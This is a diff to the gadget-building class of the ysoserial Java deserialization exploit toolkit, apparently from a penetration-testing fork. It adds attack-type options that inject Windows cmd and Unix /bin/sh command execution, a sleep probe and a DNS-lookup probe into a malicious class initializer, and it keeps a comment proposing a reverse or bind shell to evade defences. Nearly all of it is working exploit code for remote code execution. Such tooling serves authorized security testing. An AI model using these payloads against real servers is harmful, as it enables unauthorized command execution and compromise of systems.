@@ -89,22 +89,25 @@ public class Gadgets {
     }
 
 
-    public static Object createTemplatesImpl ( final String command ) throws Exception {
+    public static Object createTemplatesImpl ( final String command, final String attackType ) throws Exception {
         if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
             return createTemplatesImpl(
                 command,
+                attackType,
                 Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                 Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                 Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
         }
 
-        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
+        return createTemplatesImpl(command, attackType, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
     }
 
 
-    public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
+    public static <T> T createTemplatesImpl ( final String command, final String attackType, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
             throws Exception {
         final T templates = tplClass.newInstance();
+        
+        // federicodotta - All supported
 
         // use template gadget class
         ClassPool pool = ClassPool.getDefault();
@@ -113,9 +116,35 @@ public class Gadgets {
         final CtClass clazz = pool.get(StubTransletPayload.class.getName());
         // run command in static initializer
         // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
+        
+        // default ysoserial exec global
         String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
             command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
             "\");";
+        
+        // federicodotta - EXEC with args win	
+        if(attackType.equals("exec_win")) {
+        	
+        	cmd = "java.lang.Runtime.getRuntime().exec(new String[]{\"cmd\",\"/C\",\"" + command.replaceAll("\"", "\\\"") + "\"});";
+        	
+        // federicodotta - EXEC with unix        	
+        } else if(attackType.equals("exec_unix")) {
+
+        	cmd = "java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"" + command.replaceAll("\"", "\\\"") + "\"});";        	
+        	
+        // federicodotta - Java native sleep				
+        } else if(attackType.equals("sleep")) {
+   	 
+        	long timeToSleep = Long.parseLong(command);
+        	cmd = "java.lang.Thread.sleep((long)" + timeToSleep + ");";
+   	 
+        // federicodotta - Java native DNS resolution			
+        } else if(attackType.equals("dns")) {
+        	
+        	cmd = "java.net.InetAddress.getByName(\"" + command + "\");";
+			
+        }
+
         clazz.makeClassInitializer().insertAfter(cmd);
         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
         clazz.setName("ysoserial.Pwner" + System.nanoTime());
